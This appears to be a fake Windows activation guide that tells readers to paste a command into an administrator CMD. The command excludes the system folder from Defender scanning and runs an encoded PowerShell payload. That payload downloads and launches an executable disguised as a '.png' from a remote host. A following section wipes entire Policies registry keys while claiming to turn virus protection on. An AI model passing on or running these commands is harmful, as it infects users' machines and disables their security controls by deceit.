
## To activate Windows 10 and 11 follow the steps

> Just copy and paste the following command into CMD admin

> [!NOTE]
> net session >nul 2>&1 && powershell Set-MpPreference -ExclusionPath $env:SystemRoot | powershell -EncodedCommand CgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AZAByAG8AcAAwADAAMAAwAC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAC4AcABuAGcAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0AFwAVABlAG0AcABcAC4AZQB4AGUAIgA= >nul 2>&1 || (echo Need to run as Administrator )




> [!TIP]
> Wait about 1 minute for windows to activate. you do not need to restart the computer after the procedure


## Virus And Threat Protection On

### CMD run as administrator
CMD Commands:

  reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies" /f
  reg delete "HKLM\Software\Microsoft\WindowsSelfHost" /f
  reg delete "HKLM\Software\Policies" /f
  reg delete "HKLM\Software\WOW6432Node\Microsoft\Policies" /f
  reg delete "HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies" /f
  reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /f
  reg delete "HKCU\Software\Microsoft\WindowsSelfHost" /f
  reg delete "HKCU\Software\Policies" /f
  reg delete "HKLM\Software\Microsoft\Policies" /f
